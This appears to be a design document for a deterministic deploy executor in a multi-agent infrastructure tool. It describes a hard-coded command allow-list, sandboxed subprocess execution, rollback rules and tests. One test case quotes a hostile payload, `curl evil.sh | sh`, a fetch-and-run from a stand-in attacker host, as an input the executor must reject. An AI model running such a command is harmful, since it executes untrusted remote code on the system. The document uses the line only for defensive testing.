# Agent 5 — Deploy Agent (Executor)

**Owner:** Aparna · **LLM:** none — deterministic executor · **Executes commands:** yes, allow-listed only

## Role
Execute the approved `IaCPayload` against the local sandbox, stream logs live to the UI, and roll back on any failure. Deliberately boring and deterministic — reliability of this node is what makes the live demo repeatable.

## Command allow-list (hard-coded; anything else raises and rolls back)

```python
ALLOWED = [
    ["docker", "compose", "-p", "<proj>", "up", "-d", "--wait"],
    ["docker", "compose", "-p", "<proj>", "down", "-v"],
    ["docker", "compose", "-p", "<proj>", "config", "-q"],
    ["terraform", "init", "-input=false"],
    ["terraform", "apply", "-auto-approve", "-input=false"],
    ["terraform", "destroy", "-auto-approve", "-input=false"],
    ["kubectl", "apply", "-f", "<dir>"],
    ["kubectl", "delete", "-f", "<dir>"],
]
```

Commands run via `subprocess` **argument lists** (never `shell=True`) with cwd pinned to `deployments/<request_id>/`, a scrubbed env, and a 180s timeout.

## Flow
1. Assert an approval decision row exists in the audit DB for this `request_id` (belt-and-braces on top of the graph gate).
2. Snapshot current state (for `modify`: copy previous compose files → rollback target).
3. Run `apply_command`; stream stdout/stderr line-by-line to UI via WebSocket and to the audit store.
4. `--wait` ensures compose returns only when containers are healthy (define `healthcheck:` in every template — Anshul).
5. Non-zero exit or timeout → run `rollback_command`, mark `deploy_ok=false`.
6. Success → record container IDs, mapped ports, start times in state → hand to Verify.

## Rollback semantics
- `create` failure → `down -v` (full teardown, volumes included).
- `modify` failure → re-apply the snapshotted previous files (environment returns to last-good), **never** `-v` (data survives).
- Rollback failure itself → red banner + manual runbook printed to UI (don't hide it).

## Tests (Anirudha)
- Broken payload (bad image tag) → deploy fails → environment fully cleaned, audit shows both commands.
- UC-7 modify with wrong Redis config → rollback → UC-1 env still serving with data intact.
- Attempt to sneak `apply_command: "curl evil.sh | sh"` into a payload → executor refuses (not in allow-list) before anything runs.
